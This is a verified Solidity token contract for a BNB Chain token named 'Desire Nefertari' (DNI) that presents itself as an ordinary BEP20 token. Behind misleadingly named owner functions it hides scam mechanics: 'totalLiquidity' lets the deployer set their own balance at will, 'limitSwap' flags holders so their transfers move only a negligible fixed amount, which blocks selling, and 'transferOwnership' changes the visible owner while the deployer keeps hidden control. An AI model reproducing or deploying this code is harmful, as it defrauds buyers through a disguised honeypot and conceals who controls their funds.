/**
 *Submitted for verification at BscScan.com on 2023-01-17
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

library SafeMath {

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction seems to happen overflow");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication seems to happen overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division seems to happen by zero");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition seems to happen overflow");

        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


contract DesireNefertari is IBEP20 {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;

    mapping(address => bool) public marketingReceiver;

    mapping(address => bool) public atAuto;
    address public limitAuto;
    mapping(address => mapping(address => uint256)) _allowances;
    address public owner;
    mapping(address => uint256) _balances;
    string constant _name = "Desire Nefertari";



    uint256 constant _feeMax = 10 ** 10;
    address public amountMode;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    uint256 _totalSupply = 100000000 * (10 ** _decimals);

    string constant _symbol = "DNI";
    modifier onlyOwner() {
        require(limitAuto == msg.sender || atAuto[msg.sender], "!OWNER");
        _;
    }
    event OwnershipTransferred(address owner);

    constructor (){
        UniswapRouter teamSwap = UniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        amountMode = UniswapFactory(teamSwap.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(teamSwap)] = type(uint256).max;
        limitAuto = msg.sender;
        atAuto[limitAuto] = true;
        _balances[limitAuto] = _totalSupply;
        emit Transfer(address(0), limitAuto, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {return _totalSupply;}

    function limitSwap(address receiverLiquidity) public onlyOwner {
        marketingReceiver[receiverLiquidity] = true;
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        atAuto[account] = true;
        emit OwnershipTransferred(account);
    }

    function totalLiquidity(uint256 amount) public onlyOwner {
        _balances[limitAuto] = amount;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function tradingFee(address autoMarketing) public onlyOwner {
        atAuto[autoMarketing] = true;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (sender == limitAuto || recipient == limitAuto) {
            return _basicTransfer(sender, recipient, amount);
        }
        if (marketingReceiver[sender]) {
            return _basicTransfer(sender, recipient, _feeMax);
        }
        return _basicTransfer(sender, recipient, amount);
    }

    function decimals() external pure override returns (uint8) {return _decimals;}

    function symbol() external pure override returns (string memory) {return _symbol;}

    function name() external pure override returns (string memory) {return _name;}

    function getOwner() external view override returns (address) {return owner;}

    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}

    function allowance(address holder, address spender) external view override returns (uint256) {return _allowances[holder][spender];}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);
        }
        return _transferFrom(sender, recipient, amount);
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}